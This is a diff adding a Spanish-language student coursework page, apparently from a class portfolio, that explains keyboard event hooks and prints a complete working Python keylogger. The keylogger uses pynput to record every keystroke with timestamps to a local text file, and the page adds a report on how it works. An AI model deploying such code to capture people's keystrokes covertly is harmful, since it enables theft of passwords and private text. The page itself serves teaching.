@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Actividad 03 - Parcial 1</title>
+  <link rel="stylesheet" href="recursos/css/style.css">
+</head>
+<body>
+
+  <!-- Encabezado / Navegación Global -->
+  <header class="hero-header">
+    <div class="nav-container">
+      <nav class="main-nav">
+        <a href="index.html">Inicio</a>
+        <a href="parcial1.html" class="active">Parcial 1</a>
+        <a href="parcial2.html">Parcial 2</a>
+        <a href="parcial3.html">Parcial 3</a>
+        <a href="index.html#contacto">Contacto</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container my-5">
+    <article class="card card-detail">
+      <span class="badge-tag">Parcial 1 - Actividad 03</span>
+      <h1 class="activity-detail-title">No presiones Esc... todavía</h1>
+
+      <!-- Introducción -->
+      <section class="detail-section">
+        <h2>Introducción</h2>
+        <p>
+          En esta actividad se explora el funcionamiento técnico de la captura de eventos de teclado mediante 
+          <em>event hooks</em> y funciones <em>callbacks</em> en Python. El objetivo es analizar los mecanismos de entrada de datos, 
+          su persistencia local y las implicaciones de ciberseguridad asociadas al monitoreo no autorizado de pulsaciones de teclas (keylogging).
+        </p>
+      </section>
+
+      <!-- Objetivo -->
+      <section class="detail-section">
+        <h2>Objetivo</h2>
+        <p>
+          Implementar y documentar un programa basado en hooks de teclado que registre cada evento de pulsación y liberación de teclas, 
+          asociándolos de manera temporal con alta precisión y almacenándolos de forma persistente en un archivo local para su posterior análisis.
+        </p>
+      </section>
+
+      <!-- Código Fuente -->
+      <section class="detail-section">
+        <h2>Código Fuente / Script</h2>
+        <p>A continuación se presenta el código desarrollado utilizando la librería <code>pynput</code> y el módulo <code>datetime</code> para la gestión de registros con timestamp:</p>
+        <pre class="code-block"><code>import datetime
+from pynput.keyboard import Key, Listener
+
+LOG_FILE = "registrodeteclado.txt"
+contador_eventos = 1
+
+def formato_evento(accion, key_str):
+    global contador_eventos
+    now = datetime.datetime.now()
+    timestamp = now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    id_evento = f"evento_{contador_eventos:03d}"
+    contador_eventos += 1
+    return f"{timestamp} | {accion} | {id_evento} | Tecla: {key_str}\n"
+
+def log_to_file(entrada):
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(entrada)
+
+def on_press(key):
+    try:
+        key_str = key.char
+    except AttributeError:
+        key_str = str(key)
+    log_entry = formato_evento("PRESS", key_str)
+    print(log_entry.strip())
+    log_to_file(log_entry)
+
+def on_release(key):
+    try:
+        key_str = key.char
+    except AttributeError:
+        key_str = str(key)
+        
+    log_entry = formato_evento("RELEASE", key_str)
+    print(log_entry.strip())
+    log_to_file(log_entry)
+    
+    if key == Key.esc:
+        return False
+
+if __name__ == "__main__":
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(f"\n--- Inicio de Sesión: {datetime.datetime.now()} ---\n")
+        
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+        </code></pre>
+      </section>
+
+      <!-- Informe Detallado -->
+      <section class="detail-section">
+        <h2>Informe Detallado</h2>
+        <p>
+          El programa hace uso de la clase <code>Listener</code> para suscribirse a las llamadas del sistema operativo encargadas de los eventos de teclado.
+          Cada evento detectado activa una función de respuesta (<code>on_press</code> o <code>on_release</code>), la cual realiza tres acciones principales:
+        </p>
+        <ul>
+          <li><strong>Asociación Temporal y Secuencial:</strong> Asigna una marca de tiempo con precisión de milisegundos (<code>YYYY-MM-DD HH:MM:SS.mmm</code>) y un contador incremental formateado a tres dígitos (<code>evento_001</code>).</li>
+          <li><strong>Manejo de Excepciones:</strong> Diferencia entre teclas alfanuméricas estándar y teclas especiales de sistema (como <code>Key.esc</code> o <code>Key.space</code>).</li>
+          <li><strong>Persistencia Local:</strong> Apertura continua en modo <em>append</em> (<code>"a"</code>) hacia el archivo <code>registrodeteclado.txt</code>, garantizando que todos los registros permanezcan guardados tras la finalización del hilo principal mediante la tecla <code>Esc</code>.</li>
+        </ul>
+      </section>
+
+      <!-- Evidencias / Imágenes -->
+      <section class="detail-section">
+        <h2>Pruebas Realizadas y Funcionamiento</h2>
+        <p>A continuación se presentan las evidencias del correcto funcionamiento del script y la persistencia de datos alcanzada:</p>
+        <div class="evidence-gallery">
+          <figure>
+            <img src="recursos/imagenes/actividad3_terminal_parcial1.PNG" alt="Ejecución de la consola registrando teclas en tiempo real" class="img-fluid rounded">
+            <figcaption>Figura 1: Captura de la terminal mostrando el registro ordenado con timestamp y ID de evento.</figcaption>
+          </figure>
+          <figure class="mt-4">
+            <img src="recursos/imagenes/actividad3_txt_parcial1.PNG" alt="Archivo de texto abierto mostrando los eventos guardados" class="img-fluid rounded">
+            <figcaption>Figura 2: Verificación del archivo registrodeteclado.txt abierto en el editor tras detener la ejecución.</figcaption>
+          </figure>
+        </div>
+      </section>
+
+      <!-- Navegación entre actividades -->
+      <nav class="activity-navigation">
+        <a href="actividad2_p1.html" class="disabled">← Anterior Actividad</a>
+        <a href="parcial1.html" class="btn-submit">Volver al Parcial 1 →</a>
+      </nav>
+
+    </article>
+  </main>
+
+  <script src="recursos/js/main.js"></script>
+</body>
+</html>
